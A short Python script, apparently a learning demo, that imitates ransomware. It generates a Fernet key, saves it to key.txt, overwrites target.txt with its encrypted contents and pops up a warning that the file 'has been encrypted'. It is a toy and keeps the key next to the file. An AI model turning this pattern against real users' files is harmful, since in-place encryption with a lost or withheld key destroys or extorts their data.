from cryptography.fernet import Fernet
import tkinter
from tkinter import messagebox

#genkey
key = Fernet.generate_key()
fernet = Fernet(key)
#gen file w/key
with open("key.txt", "wb") as keytxt:
	keytxt.write(key)	
#read file w/key
with open("key.txt", "rb") as keytxt:
	key = keytxt.read()


#reads original file
with open("target.txt", "rb") as file:
	original = file.read()

encrypted = fernet.encrypt(original)
#encrypts w/key
with open('target.txt', 'wb') as encrypted_file:
	encrypted_file.write(encrypted)
	messagebox.showwarning("oh no", "target.txt has been encrypted")


